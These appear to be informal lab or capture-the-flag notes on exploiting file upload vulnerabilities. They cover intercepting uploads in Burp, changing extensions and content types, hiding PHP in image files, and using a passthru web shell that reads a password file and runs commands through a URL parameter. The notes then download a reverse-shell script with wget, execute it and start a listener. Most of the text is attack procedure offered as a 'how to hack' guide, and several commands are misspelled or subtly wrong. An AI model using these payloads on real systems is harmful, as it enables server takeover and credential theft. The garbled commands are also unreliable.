in file uploading vulnerablity first try to uploads file in the webapplication if its uploaded sucessfully than there may be the chance for file 
uploding vulnerable 
how to hack open the burp and intercept the prozy usally there will be .jpg or.png file only you can upload if you can upload .php or.xml than you
you can take remote connection 
if its filterd than try for secound step cach in burp and try to modey there 
eg : upload the file with .jpg in browser and and change it to .php in burp or you can can give like this in burp like this img.php.jpg this may be 
vunlerable if they are trying filter only the last estenstion 
filename ="test.jpg" to test.php
contant-type = image/jpg to application/php ==> this may be filtered by  the application
and remove the picture and type php code like <? php echo passthru('cat /etc/natas_webpass/natas13'); ?>

the third example is try to upload the img file and in the burp edit the contant in middle of the file and try to insret php file in the midle of the 
hashing file which most of the application does not check 
eg:file.png.php
contant type: image/png

image file formate and php code

and run in browser 10.10.10.185/upload.php?c=whomai 
for reverseshell 
you can get reverseshell in many ways
in that one ways is using pyhton
python -m SimpleHTTPServer
now download the tcp_pty_bacconect.py using burp 
1.?c = wget 127.0.0.1:8000/tcp_pty_bacconect.py -0/dev/shm/erv.py
2.?c=cat /dev/shm/erv.py you should see the file
than change it to pyhton /dev/shm etc...
before that make the lisener 
now go to the python pty folder and 
type python tcp_pty_shell_handler.py -b 127.0.0.1:1234
to get the flag root@kali:~#find /home -type f -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | colum -t
